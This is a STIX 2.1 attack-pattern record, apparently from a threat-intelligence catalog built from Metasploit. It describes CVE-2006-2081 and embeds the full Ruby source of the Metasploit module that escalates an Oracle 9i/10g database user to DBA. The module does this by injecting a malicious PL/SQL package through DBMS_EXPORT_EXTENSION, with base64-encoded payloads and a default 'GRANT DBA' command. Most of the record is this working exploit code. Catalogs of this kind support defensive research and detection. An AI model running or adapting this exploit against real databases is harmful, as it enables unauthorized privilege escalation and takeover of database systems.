{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16ff434f-1ece-4df6-810a-36ce3ae5c03b",
    "created": "2024-08-14T16:22:08.323258Z",
    "modified": "2024-08-14T16:22:08.323262Z",
    "name": "Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION",
    "description": " This module will escalate an Oracle DB user to DBA by exploiting a sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.  Note: This module has been tested against 9i, 10gR1 and 10gR2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/dbms_export_extension.rb",
            "external_id": "dbms_export_extension.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2081"
        },
        {
            "source_name": "reference",
            "url": "http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',\n      'Description'    => %q{\n        This module will escalate an Oracle DB user to DBA by exploiting a\n        sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.\n\n        Note: This module has been tested against 9i, 10gR1 and 10gR2.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2081' ],\n          [ 'OSVDB', '25002' ],\n          [ 'BID', '17699' ],\n          [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ],\n        ],\n      'DisclosureDate' => '2006-04-26'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execute.', \"GRANT DBA TO #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    package = %Q|\ncreate or replace package #{name} authid current_user is\nfunction ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)\nreturn number;\nend;\n    |\n\n    body = %Q|\ncreate or replace package body #{name} is\nfunction ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)\nreturn number is\npragma autonomous_transaction;\nbegin\nexecute immediate '#{datastore['SQL']}';\ncommit;\nreturn(0);\nend;\nend;\n    |\n\n    sploit = %Q|\ndeclare\n#{rand1} pls_integer;\n#{rand2} number;\n#{rand3} varchar(32767);\nbegin\n#{rand2} := 0;\n#{rand3} := sys.dbms_export_extension.get_domain_index_metadata('#{name}', '#{datastore['DBUSER']}', '#{name}', '#{datastore['DBUSER']}', '', newblock => #{rand1}, gmflags => #{rand2});\nend;\n    |\n\n    encoded_package = %Q|\ndeclare\n#{rand1} varchar2(32767);\nbegin\n#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(package)}')));\nexecute immediate #{rand1};\nend;\n    |\n\n    encoded_body = %Q|\ndeclare\n#{rand2} varchar2(32767);\nbegin\n#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(body)}')));\nexecute immediate #{rand2};\nend;\n    |\n\n    encoded_sploit = %Q|\ndeclare\n#{rand3} varchar2(32767);\nbegin\n#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(sploit)}')));\nexecute immediate #{rand3};\nend;\n    |\n\n    # Finally...\n    print_status(\"Sending package '#{name}'...\")\n    prepare_exec(encoded_package)\n\n    print_status(\"Sending body '#{name}'...\")\n    prepare_exec(encoded_body)\n\n    print_status(\"Attempting sql injection on SYS.DBMS_EXPORT_EXTENSION...\")\n    prepare_exec(encoded_sploit)\n\n    # Probably should do a 'drop package #{name}'\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-04-26"
}